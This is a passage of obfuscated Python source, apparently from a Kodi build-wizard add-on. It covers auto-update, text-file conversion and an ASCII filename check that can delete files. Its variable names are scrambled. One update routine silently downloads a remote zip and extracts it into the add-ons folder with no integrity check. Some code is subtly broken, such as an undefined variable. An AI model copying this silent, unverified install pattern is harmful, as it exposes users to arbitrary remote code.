				extract .all (OOOOO000OO0OOOOO0 ,ADDONS )#line:1217
				DP2 .close ()#line:1218
				LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הויזארד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:1219
				log ("[Auto Update Wizard] Wizard updated to v%s"%OO0OO0O0O0OOOOOOO ,xbmc .LOGNOTICE )#line:1220
				return #line:1222
			else :log ("[Auto Update Wizard] Install New Wizard Ignored: %s"%OO0OO0O0O0OOOOOOO ,xbmc .LOGNOTICE )#line:1223
		else :#line:1224
			if not startup :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No New Version of Wizard[/COLOR]"%COLOR2 )#line:1225
			log ("[Auto Update Wizard] No New Version v%s"%OO0OO0O0O0OOOOOOO ,xbmc .LOGNOTICE )#line:1226
	else :log ("[Auto Update Wizard] Url for wizard file not valid: %s"%WIZARDFILE ,xbmc .LOGNOTICE )#line:1227
def wizardUpdateDP (startup =None ):#line:1229
	if workingURL (WIZARDFILE ):#line:1230
		OO00O0O0OO00O0OOO =checkWizard ('version')#line:1231
		OO0000O00000O0O00 =checkWizard ('zip')#line:1232
		if OO00O0O0OO00O0OOO >VERSION :#line:1233
			OO000OOOO0O000O0O =1 #line:1234
			if OO000OOOO0O000O0O :#line:1235
				log ("[Auto Update Wizard] Installing wizard v%s"%OO00O0O0OO00O0OOO ,xbmc .LOGNOTICE )#line:1236
				DP .create (ADDONTITLE ,'[COLOR %s]עדכון אוטומטי לויזארד:'%COLOR2 ,'','אנא המתן[/COLOR]')#line:1237
				OO000O000000OOO0O =os .path .join (PACKAGES ,'%s-%s.zip'%(ADDON_ID ,OO00O0O0OO00O0OOO ))#line:1238
				try :os .remove (OO000O000000OOO0O )#line:1239
				except :pass #line:1240
				if 'google'in OO0000O00000O0O00 :#line:1241
					O00O0OO00OOOO00OO =googledrive_download (OO0000O00000O0O00 ,OO000O000000OOO0O ,DP ,checkWizard ('filesize'))#line:1242
				downloader .download (OO0000O00000O0O00 ,OO000O000000OOO0O ,DP )#line:1243
				xbmc .sleep (2000 )#line:1244
				DP .update (0 ,"","Installing %s update"%ADDONTITLE )#line:1245
				O0000O0000O000OOO ,O0OO0OO0OO000OO00 ,O00OO00OO0OOO0000 =extract .all (OO000O000000OOO0O ,ADDONS ,DP ,True )#line:1246
				DP .close ()#line:1247
				LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הויזארד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:1248
				log ("[Auto Update Wizard] Wizard updated to v%s"%OO00O0O0OO00O0OOO ,xbmc .LOGNOTICE )#line:1249
				return #line:1251
			else :log ("[Auto Update Wizard] Install New Wizard Ignored: %s"%OO00O0O0OO00O0OOO ,xbmc .LOGNOTICE )#line:1252
		else :#line:1253
			if not startup :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No New Version of Wizard[/COLOR]"%COLOR2 )#line:1254
			log ("[Auto Update Wizard] No New Version v%s"%OO00O0O0OO00O0OOO ,xbmc .LOGNOTICE )#line:1255
	else :log ("[Auto Update Wizard] Url for wizard file not valid: %s"%WIZARDFILE ,xbmc .LOGNOTICE )#line:1256
def convertText ():#line:1258
	OOO000O0O0000O0O0 =os .path .join (ADDONDATA ,'TextFiles')#line:1259
	if not os .path .exists (OOO000O0O0000O0O0 ):os .makedirs (OOO000O0O0000O0O0 )#line:1260
	DP .create (ADDONTITLE ,'[COLOR %s][B]Converting Text:[/B][/COLOR]'%(COLOR2 ),'','Please Wait')#line:1262
	if not SPEEDFILE =='http://':#line:1264
		OO00000O0O00000O0 =os .path .join (OOO000O0O0000O0O0 ,'builds.txt')#line:1265
		OO00OOO0000OO0OO0 ='';OO0OOOO00OOOO00OO =0 #line:1266
		O0OO0O00O0OOOOO0O =openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1267
		DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]Builds.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:1268
		if WIZARDFILE ==SPEEDFILE :#line:1269
			try :#line:1270
				O0000OO00O00O0OO0 ,O000O00O000OO0000 ,OO00OO00O0O00OO0O =checkWizard ('all')#line:1271
				OO00OOO0000OO0OO0 ='id="%s"\n'%O0000OO00O00O0OO0 #line:1272
				OO00OOO0000OO0OO0 +='version="%s"\n'%O000O00O000OO0000 #line:1273
				OO00OOO0000OO0OO0 +='zip="%s"\n'%OO00OO00O0O00OO0O #line:1274
			except :#line:1275
				pass #line:1276
		OOO0O0OO000000OOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)"').findall (O0OO0O00O0OOOOO0O )#line:1277
		OOOOO0OO00000O00O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0O00O0OOOOO0O )#line:1278
		if len (OOOOO0OO00000O00O )==0 :#line:1279
			for OOO0OO00O0O0O0OOO ,O000O00O000OO0000 ,OO00OO00O0O00OO0O ,O0O0O000O0O0OO0OO ,O000000O00O0O0OOO ,O0O0OO0000O0OOO0O ,OOO00O0OOOO0O00OO ,O000O0O0OO0OOOOOO in OOO0O0OO000000OOO :#line:1280
				OO0OOOO00OOOO00OO +=1 #line:1281
				DP .update (int (percentage (OO0OOOO00OOOO00OO ,len (OOOOO0OO00000O00O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0O0O0OOO ))#line:1282
				if not OO00OOO0000OO0OO0 =='':OO00OOO0000OO0OO0 +='\n'#line:1283
				OO00OOO0000OO0OO0 +='name="%s"\n'%OOO0OO00O0O0O0OOO #line:1284
				OO00OOO0000OO0OO0 +='version="%s"\n'%O000O00O000OO0000 #line:1285
				OO00OOO0000OO0OO0 +='url="%s"\n'%OO00OO00O0O00OO0O #line:1286
				OO00OOO0000OO0OO0 +='gui="%s"\n'%O0O0O000O0O0OO0OO #line:1287
				OO00OOO0000OO0OO0 +='kodi="%s"\n'%O000000O00O0O0OOO #line:1288
				OO00OOO0000OO0OO0 +='theme="%s"\n'%O0O0OO0000O0OOO0O #line:1289
				OO00OOO0000OO0OO0 +='icon="%s"\n'%OOO00O0OOOO0O00OO #line:1290
				OO00OOO0000OO0OO0 +='fanart="%s"\n'%O000O0O0OO0OOOOOO #line:1291
				OO00OOO0000OO0OO0 +='preview="http://"\n'#line:1292
				OO00OOO0000OO0OO0 +='adult="no"\n'#line:1293
				OO00OOO0000OO0OO0 +='description="Download %s from %s"\n'%(OOO0OO00O0O0O0OOO ,ADDONTITLE )#line:1294
				if not O0O0OO0000O0OOO0O =='http://':#line:1295
					O00OOOOOO00O00OOO =os .path .join (OOO000O0O0000O0O0 ,'%s_theme.txt'%OOO0OO00O0O0O0OOO )#line:1296
					OOO00OO00O0OOOO0O ='';OO0O0O0OOO0O0OOOO =0 #line:1297
					O0OO0O00O0OOOOO0O =openURL (O0O0OO0000O0OOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1298
					DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]%s_theme.txt[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O0O0OOO ),'','Please Wait')#line:1299
					OOOOO00O0000O0000 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO0O00O0OOOOO0O )#line:1300
					for OOO0OO00O0O0O0OOO ,OO00OO00O0O00OO0O ,OOO00O0OOOO0O00OO ,O000O0O0OO0OOOOOO ,O00O0O0O0OOO0OO0O in OOOOO00O0000O0000 :#line:1301
						OO0O0O0OOO0O0OOOO +=1 #line:1302
						DP .update (int (percentage (OO0O0O0OOO0O0OOOO ,len (OOOOO0OO00000O00O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0O0O0OOO ))#line:1303
						if not OOO00OO00O0OOOO0O =='':OOO00OO00O0OOOO0O +='\n'#line:1304
						OOO00OO00O0OOOO0O +='name="%s"\n'%OOO0OO00O0O0O0OOO #line:1305
						OOO00OO00O0OOOO0O +='url="%s"\n'%OO00OO00O0O00OO0O #line:1306
						OOO00OO00O0OOOO0O +='icon="%s"\n'%OOO00O0OOOO0O00OO #line:1307
						OOO00OO00O0OOOO0O +='fanart="%s"\n'%O000O0O0OO0OOOOOO #line:1308
						OOO00OO00O0OOOO0O +='adult="no"\n'#line:1309
						OOO00OO00O0OOOO0O +='description="%s"\n'%O00O0O0O0OOO0OO0O #line:1310
					OOOO0OOOOOOOOOOOO =open (O00OOOOOO00O00OOO ,'w');OOOO0OOOOOOOOOOOO .write (OOO00OO00O0OOOO0O );OOOO0OOOOOOOOOOOO .close ()#line:1311
		else :#line:1312
			for OOO0OO00O0O0O0OOO ,O000O00O000OO0000 ,OO00OO00O0O00OO0O ,O0O0O000O0O0OO0OO ,O000000O00O0O0OOO ,O0O0OO0000O0OOO0O ,OOO00O0OOOO0O00OO ,O000O0O0OO0OOOOOO ,OOOOO0000O0000OO0 ,O00O0O0O0OOO0OO0O in OOOOO0OO00000O00O :#line:1313
				OO0OOOO00OOOO00OO +=1 #line:1314
				DP .update (int (percentage (OO0OOOO00OOOO00OO ,len (OOOOO0OO00000O00O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0O0O0OOO ))#line:1315
				if not OO00OOO0000OO0OO0 =='':OO00OOO0000OO0OO0 +='\n'#line:1316
				OO00OOO0000OO0OO0 +='name="%s"\n'%OOO0OO00O0O0O0OOO #line:1317
				OO00OOO0000OO0OO0 +='version="%s"\n'%O000O00O000OO0000 #line:1318
				OO00OOO0000OO0OO0 +='url="%s"\n'%OO00OO00O0O00OO0O #line:1319
				OO00OOO0000OO0OO0 +='gui="%s"\n'%O0O0O000O0O0OO0OO #line:1320
				OO00OOO0000OO0OO0 +='kodi="%s"\n'%O000000O00O0O0OOO #line:1321
				OO00OOO0000OO0OO0 +='theme="%s"\n'%O0O0OO0000O0OOO0O #line:1322
				OO00OOO0000OO0OO0 +='icon="%s"\n'%OOO00O0OOOO0O00OO #line:1323
				OO00OOO0000OO0OO0 +='fanart="%s"\n'%O000O0O0OO0OOOOOO #line:1324
				OO00OOO0000OO0OO0 +='preview="http://"\n'#line:1325
				OO00OOO0000OO0OO0 +='adult="%s"\n'%OOOOO0000O0000OO0 #line:1326
				OO00OOO0000OO0OO0 +='description="%s"\n'%O00O0O0O0OOO0OO0O #line:1327
				if not O0O0OO0000O0OOO0O =='http://':#line:1328
					O00OOOOOO00O00OOO =os .path .join (OOO000O0O0000O0O0 ,'%s_theme.txt'%OOO0OO00O0O0O0OOO )#line:1329
					OOO00OO00O0OOOO0O ='';OO0O0O0OOO0O0OOOO =0 #line:1330
					O0OO0O00O0OOOOO0O =openURL (O0O0OO0000O0OOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1331
					DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]%s_theme.txt[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O0O0OOO ),'','Please Wait')#line:1332
					OOOOO00O0000O0000 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO0O00O0OOOOO0O )#line:1333
					for OOO0OO00O0O0O0OOO ,OO00OO00O0O00OO0O ,OOO00O0OOOO0O00OO ,O000O0O0OO0OOOOOO ,O00O0O0O0OOO0OO0O in OOOOO00O0000O0000 :#line:1334
						OO0O0O0OOO0O0OOOO +=1 #line:1335
						DP .update (int (percentage (OO0O0O0OOO0O0OOOO ,len (OOOOO0OO00000O00O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0O0O0OOO ))#line:1336
						if not OOO00OO00O0OOOO0O =='':OOO00OO00O0OOOO0O +='\n'#line:1337
						OOO00OO00O0OOOO0O +='name="%s"\n'%OOO0OO00O0O0O0OOO #line:1338
						OOO00OO00O0OOOO0O +='url="%s"\n'%OO00OO00O0O00OO0O #line:1339
						OOO00OO00O0OOOO0O +='icon="%s"\n'%OOO00O0OOOO0O00OO #line:1340
						OOO00OO00O0OOOO0O +='fanart="%s"\n'%O000O0O0OO0OOOOOO #line:1341
						OOO00OO00O0OOOO0O +='adult="no"\n'#line:1342
						OOO00OO00O0OOOO0O +='description="%s"\n'%O00O0O0O0OOO0OO0O #line:1343
					OOOO0OOOOOOOOOOOO =open (O00OOOOOO00O00OOO ,'w');OOOO0OOOOOOOOOOOO .write (OOO00OO00O0OOOO0O );OOOO0OOOOOOOOOOOO .close ()#line:1344
		OOOO0OOOOOOOOOOOO =open (OO00000O0O00000O0 ,'w');OOOO0OOOOOOOOOOOO .write (OO00OOO0000OO0OO0 );OOOO0OOOOOOOOOOOO .close ()#line:1345
	if not APKFILE =='http://':#line:1347
		OO00000O0O00000O0 =os .path .join (OOO000O0O0000O0O0 ,'apks.txt')#line:1348
		OO00OOO0000OO0OO0 ='';OO0OOOO00OOOO00OO =0 #line:1349
		O0OO0O00O0OOOOO0O =openURL (APKFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1350
		DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]Apks.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:1351
		OOO0O0OO000000OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)"').findall (O0OO0O00O0OOOOO0O )#line:1352
		OOOOO0OO00000O00O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0O00O0OOOOO0O )#line:1353
		if len (OOOOO0OO00000O00O )==0 :#line:1354
			for OOO0OO00O0O0O0OOO ,OO00OO00O0O00OO0O ,OOO00O0OOOO0O00OO ,O000O0O0OO0OOOOOO in OOO0O0OO000000OOO :#line:1355
				OO0OOOO00OOOO00OO +=1 #line:1356
				DP .update (int (percentage (OO0OOOO00OOOO00OO ,len (OOO0O0OO000000OOO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0O0O0OOO ))#line:1357
				if not OO00OOO0000OO0OO0 =='':OO00OOO0000OO0OO0 +='\n'#line:1358
				OO00OOO0000OO0OO0 +='name="%s"\n'%OOO0OO00O0O0O0OOO #line:1359
				OO00OOO0000OO0OO0 +='section="no"'#line:1360
				OO00OOO0000OO0OO0 +='url="%s"\n'%OO00OO00O0O00OO0O #line:1361
				OO00OOO0000OO0OO0 +='icon="%s"\n'%OOO00O0OOOO0O00OO #line:1362
				OO00OOO0000OO0OO0 +='fanart="%s"\n'%O000O0O0OO0OOOOOO #line:1363
				OO00OOO0000OO0OO0 +='adult="no"\n'#line:1364
				OO00OOO0000OO0OO0 +='description="Download %s from %s"\n'%(OOO0OO00O0O0O0OOO ,ADDONTITLE )#line:1365
		else :#line:1366
			for OOO0OO00O0O0O0OOO ,OO00OO00O0O00OO0O ,OOO00O0OOOO0O00OO ,O000O0O0OO0OOOOOO ,OOOOO0000O0000OO0 ,O00O0O0O0OOO0OO0O in OOOOO0OO00000O00O :#line:1367
				OO0OOOO00OOOO00OO +=1 #line:1368
				DP .update (int (percentage (OO0OOOO00OOOO00OO ,len (OOOOO0OO00000O00O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0O0O0OOO ))#line:1369
				if not OO00OOO0000OO0OO0 =='':OO00OOO0000OO0OO0 +='\n'#line:1370
				OO00OOO0000OO0OO0 +='name="%s"\n'%OOO0OO00O0O0O0OOO #line:1371
				OO00OOO0000OO0OO0 +='section="no"'#line:1372
				OO00OOO0000OO0OO0 +='url="%s"\n'%OO00OO00O0O00OO0O #line:1373
				OO00OOO0000OO0OO0 +='icon="%s"\n'%OOO00O0OOOO0O00OO #line:1374
				OO00OOO0000OO0OO0 +='fanart="%s"\n'%O000O0O0OO0OOOOOO #line:1375
				OO00OOO0000OO0OO0 +='adult="%s"\n'%OOOOO0000O0000OO0 #line:1376
				OO00OOO0000OO0OO0 +='description="%s"\n'%O00O0O0O0OOO0OO0O #line:1377
		OOOO0OOOOOOOOOOOO =open (OO00000O0O00000O0 ,'w');OOOO0OOOOOOOOOOOO .write (OO00OOO0000OO0OO0 );OOOO0OOOOOOOOOOOO .close ()#line:1378
	if not YOUTUBEFILE =='http://':#line:1380
		OO00000O0O00000O0 =os .path .join (OOO000O0O0000O0O0 ,'youtube.txt')#line:1381
		OO00OOO0000OO0OO0 ='';OO0OOOO00OOOO00OO =0 #line:1382
		O0OO0O00O0OOOOO0O =openURL (YOUTUBEFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1383
		DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]YouTube.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:1384
		OOO0O0OO000000OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO0O00O0OOOOO0O )#line:1385
		for OOO0OO00O0O0O0OOO ,OO00OO00O0O00OO0O ,OOO00O0OOOO0O00OO ,O000O0O0OO0OOOOOO ,O00O0O0O0OOO0OO0O in OOO0O0OO000000OOO :#line:1386
			OO0OOOO00OOOO00OO +=1 #line:1387
			DP .update (int (percentage (OO0OOOO00OOOO00OO ,len (OOO0O0OO000000OOO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0O0O0OOO ))#line:1388
			if not OO00OOO0000OO0OO0 =='':OO00OOO0000OO0OO0 +='\n'#line:1389
			OO00OOO0000OO0OO0 +='name="%s"\n'%OOO0OO00O0O0O0OOO #line:1390
			OO00OOO0000OO0OO0 +='section="no"'#line:1391
			OO00OOO0000OO0OO0 +='url="%s"\n'%OO00OO00O0O00OO0O #line:1392
			OO00OOO0000OO0OO0 +='icon="%s"\n'%OOO00O0OOOO0O00OO #line:1393
			OO00OOO0000OO0OO0 +='fanart="%s"\n'%O000O0O0OO0OOOOOO #line:1394
			OO00OOO0000OO0OO0 +='description="%s"\n'%O00O0O0O0OOO0OO0O #line:1395
		OOOO0OOOOOOOOOOOO =open (OO00000O0O00000O0 ,'w');OOOO0OOOOOOOOOOOO .write (OO00OOO0000OO0OO0 );OOOO0OOOOOOOOOOOO .close ()#line:1396
	if not ADVANCEDFILE =='http://':#line:1398
		OO00000O0O00000O0 =os .path .join (OOO000O0O0000O0O0 ,'advancedsettings.txt')#line:1399
		OO00OOO0000OO0OO0 ='';OO0OOOO00OOOO00OO =0 #line:1400
		O0OO0O00O0OOOOO0O =openURL (ADVANCEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1401
		DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]AdvancedSettings.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:1402
		OOO0O0OO000000OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO0O00O0OOOOO0O )#line:1403
		for OOO0OO00O0O0O0OOO ,OO00OO00O0O00OO0O ,OOO00O0OOOO0O00OO ,O000O0O0OO0OOOOOO ,O00O0O0O0OOO0OO0O in OOO0O0OO000000OOO :#line:1404
			OO0OOOO00OOOO00OO +=1 #line:1405
			DP .update (int (percentage (OO0OOOO00OOOO00OO ,len (OOO0O0OO000000OOO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0O0O0OOO ))#line:1406
			if not OO00OOO0000OO0OO0 =='':OO00OOO0000OO0OO0 +='\n'#line:1407
			OO00OOO0000OO0OO0 +='name="%s"\n'%OOO0OO00O0O0O0OOO #line:1408
			OO00OOO0000OO0OO0 +='section="no"'#line:1409
			OO00OOO0000OO0OO0 +='url="%s"\n'%OO00OO00O0O00OO0O #line:1410
			OO00OOO0000OO0OO0 +='icon="%s"\n'%OOO00O0OOOO0O00OO #line:1411
			OO00OOO0000OO0OO0 +='fanart="%s"\n'%O000O0O0OO0OOOOOO #line:1412
			OO00OOO0000OO0OO0 +='description="%s"\n'%O00O0O0O0OOO0OO0O #line:1413
		OOOO0OOOOOOOOOOOO =open (OO00000O0O00000O0 ,'w');OOOO0OOOOOOOOOOOO .write (OO00OOO0000OO0OO0 );OOOO0OOOOOOOOOOOO .close ()#line:1414
	DP .close ()#line:1416
	DIALOG .ok (ADDONTITLE ,'[COLOR %s]Your text files have been converted to 0.1.7 and are location in the [COLOR %s]/addon_data/%s/[/COLOR] folder[/COLOR]'%(COLOR2 ,COLOR1 ,ADDON_ID ))#line:1417
def reloadProfile (profile =None ):#line:1419
	if profile ==None :#line:1420
		ebi ('LoadProfile(Master user)')#line:1427
	else :ebi ('LoadProfile(%s)'%profile )#line:1428
def chunks (O00O0OOO00OOO0OO0 ,O0OOOOOOO0OO0OO00 ):#line:1430
	for O00O0O0O0O00000OO in range (0 ,len (O00O0OOO00OOO0OO0 ),O0OOOOOOO0OO0OO00 ):#line:1431
		yield O00O0OOO00OOO0OO0 [O00O0O0O0O00000OO :O00O0O0O0O00000OO +O0OOOOOOO0OO0OO00 ]#line:1432
def asciiCheck (use =None ,over =False ):#line:1434
	if use ==None :#line:1435
		OO00O0O0O000OO000 =DIALOG .browse (3 ,'[COLOR %s]Select the folder you want to scan[/COLOR]'%COLOR2 ,'files','',False ,False ,HOME )#line:1436
		if over ==True :#line:1437
			O000O0OOO0OOOOO00 =1 #line:1438
		else :#line:1439
			O000O0OOO0OOOOO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Do you want to [COLOR %s]delete[/COLOR] all filenames with special characters or would you rather just [COLOR %s]scan and view[/COLOR] the results in the log?[/COLOR]'%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ='[B][COLOR green]Delete[/COLOR][/B]',nolabel ='[B][COLOR red]Scan[/COLOR][/B]')#line:1440
	else :#line:1441
		OO00O0O0O000OO000 =use #line:1442
		O000O0OOO0OOOOO00 =1 #line:1443
	if OO00O0O0O000OO000 =="":#line:1445
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: Cancelled[/COLOR]"%COLOR2 )#line:1446
		return #line:1447
	O00OOOOOOOO0O0O00 =os .path .join (ADDONDATA ,'asciifiles.txt')#line:1449
	O0000OOOOO00O0O0O =os .path .join (ADDONDATA ,'asciifails.txt')#line:1450
	OOO0O0O0OOOOOOOO0 =open (O00OOOOOOOO0O0O00 ,mode ='w+')#line:1451
	O0OOO0000O000OOO0 =open (O0000OOOOO00O0O0O ,mode ='w+')#line:1452
	OO00O00OOOO000OO0 =0 ;OO0OO0OO0OOO0O00O =0 #line:1453
	OOOOOO0O000OO0OO0 =fileCount (OO00O0O0O000OO000 )#line:1454
	O0OO00OO0O0OO0OO0 =''#line:1455
	O000OO000O00O0O0O =[]#line:1456
	log ("Source file: (%s)"%str (OO00O0O0O000OO000 ),xbmc .LOGNOTICE )#line:1457
	DP .create (ADDONTITLE ,'Please wait...')#line:1459
	for O00OOOOO0OO000O0O ,OO0OOOO00O0O000O0 ,O000000000O000O0O in os .walk (OO00O0O0O000OO000 ):#line:1460
		OO0OOOO00O0O000O0 [:]=[O00O0O00OO0OO00OO for O00O0O00OO0OO00OO in OO0OOOO00O0O000O0 ]#line:1461
		O000000000O000O0O [:]=[O00OO0O00O00OO000 for O00OO0O00O00OO000 in O000000000O000O0O ]#line:1462
		for OOOOOO00O0OO0O0OO in O000000000O000O0O :#line:1463
			O000OO000O00O0O0O .append (OOOOOO00O0OO0O0OO )#line:1464
			O000OOO000OOOO0OO =int (len (O000OO000O00O0O0O )/float (OOOOOO0O000OO0OO0 )*100 )#line:1465
			DP .update (O000OOO000OOOO0OO ,"[COLOR %s]Checking for non ASCII files"%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,d ),'Please Wait[/COLOR]')#line:1466
			try :#line:1467
				OOOOOO00O0OO0O0OO .encode ('ascii')#line:1468
			except UnicodeDecodeError :#line:1469
				O00OO00OOOO00000O =os .path .join (O00OOOOO0OO000O0O ,OOOOOO00O0OO0O0OO )#line:1470
				if O000O0OOO0OOOOO00 :#line:1471
					try :#line:1472
						os .remove (O00OO00OOOO00000O )#line:1473
						for O0000000OOOOOOO00 in chunks (O00OO00OOOO00000O ,75 ):#line:1474
							OOO0O0O0OOOOOOOO0 .write (O0000000OOOOOOO00 +'\n')#line:1475
						OOO0O0O0OOOOOOOO0 .write ('\n')#line:1476
						OO00O00OOOO000OO0 +=1 #line:1477
						log ("[ASCII Check] File Removed: %s "%O00OO00OOOO00000O ,xbmc .LOGERROR )#line:1478
					except :#line:1479
						for O0000000OOOOOOO00 in chunks (O00OO00OOOO00000O ,75 ):#line:1480
							O0OOO0000O000OOO0 .write (O0000000OOOOOOO00 +'\n')#line:1481
						O0OOO0000O000OOO0 .write ('\n')#line:1482
						OO0OO0OO0OOO0O00O +=1 #line:1483
						log ("[ASCII Check] File Failed: %s "%O00OO00OOOO00000O ,xbmc .LOGERROR )#line:1484
				else :#line:1485
					for O0000000OOOOOOO00 in chunks (O00OO00OOOO00000O ,75 ):#line:1486
						OOO0O0O0OOOOOOOO0 .write (O0000000OOOOOOO00 +'\n')#line:1487
					OOO0O0O0OOOOOOOO0 .write ('\n')#line:1488
					OO00O00OOOO000OO0 +=1 #line:1489
					log ("[ASCII Check] File Found: %s "%O00OO00OOOO00000O ,xbmc .LOGERROR )#line:1490
				pass #line:1491
	DP .close ();OOO0O0O0OOOOOOOO0 .close ();O0OOO0000O000OOO0 .close ()#line:1492
	OOO0000O000OOO0O0 =int (OO00O00OOOO000OO0 )+int (OO0OO0OO0OOO0O00O )#line:1493
	if OOO0000O000OOO0O0 >0 :#line:1494
		if os .path .exists (O00OOOOOOOO0O0O00 ):OOO0O0O0OOOOOOOO0 =open (O00OOOOOOOO0O0O00 ,mode ='r');O0OO00OO0O0OO0OO0 =OOO0O0O0OOOOOOOO0 .read ();OOO0O0O0OOOOOOOO0 .close ()#line:1495
		if os .path .exists (O0000OOOOO00O0O0O ):O0OOO0000O000OOO0 =open (O0000OOOOO00O0O0O ,mode ='r');OOOOOO0OO0OO0000O =O0OOO0000O000OOO0 .read ();O0OOO0000O000OOO0 .close ()#line:1496
		if O000O0OOO0OOOOO00 :#line:1497
			if use :#line:1498
				LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: %s Removed / %s Failed.[/COLOR]"%(COLOR2 ,OO00O00OOOO000OO0 ,OO0OO0OO0OOO0O00O ))#line:1499
			else :#line:1500
				TextBox (ADDONTITLE ,"[COLOR yellow][B]%s Files Removed:[/B][/COLOR]\n %s\n\n[COLOR yellow][B]%s Files Failed:[B][/COLOR]\n %s"%(OO00O00OOOO000OO0 ,O0OO00OO0O0OO0OO0 ,OO0OO0OO0OOO0O00O ,OOOOOO0OO0OO0000O ))#line:1501
		else :#line:1502
			TextBox (ADDONTITLE ,"[COLOR yellow][B]%s Files Found:[/B][/COLOR]\n %s"%(OO00O00OOOO000OO0 ,O0OO00OO0O0OO0OO0 ))#line:1503
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: None Found.[/COLOR]"%COLOR2 )#line:1504
def fileCount (OO00OO0O00OOO00OO ,excludes =True ):#line:1506
	O0OOO00OOO00OOOO0 =[ADDON_ID ,'cache','system','packages','Thumbnails','peripheral_data','temp','My_Builds','library','keymaps']#line:1507
	O0OO0OOO0O0OOO0O0 =['Textures13.db','.DS_Store','advancedsettings.xml','Thumbs.db','.gitignore']#line:1508
	O0OO0OO0OOOO0OOO0 =[]#line:1509
	for O00000O0O00OOOOOO ,OOOOOOO0O000OOO00 ,OO00O00O000O0OO0O in os .walk (OO00OO0O00OOO00OO ):#line:1510
		if excludes :#line:1511
			OOOOOOO0O000OOO00 [:]=[OO0OOO00O00O00OOO for OO0OOO00O00O00OOO in OOOOOOO0O000OOO00 if OO0OOO00O00O00OOO not in O0OOO00OOO00OOOO0 ]#line:1512
			OO00O00O000O0OO0O [:]=[O0O00000OOOO00OO0 for O0O00000OOOO00OO0 in OO00O00O000O0OO0O if O0O00000OOOO00OO0 not in O0OO0OOO0O0OOO0O0 ]#line:1513
		for OOOOOOO00OOOO00O0 in OO00O00O000O0OO0O :#line:1514
			O0OO0OO0OOOO0OOO0 .append (OOOOOOO00OOOO00O0 )#line:1515
	return len (O0OO0OO0OOOO0OOO0 )#line:1516
def defaultSkin ():#line:1518
	log ("[Default Skin Check]",xbmc .LOGNOTICE )#line:1519
	O0O00OO0OO0000OOO =os .path .join (USERDATA ,'guitemp.xml')#line:1520
	OO00OOOO0O0O00O00 =O0O00OO0OO0000OOO if os .path .exists (O0O00OO0OO0000OOO )else GUISETTINGS #line:1521
	if not os .path .exists (OO00OOOO0O0O00O00 ):return False #line:1522
	log ("Reading gui file: %s"%OO00OOOO0O0O00O00 ,xbmc .LOGNOTICE )#line:1523
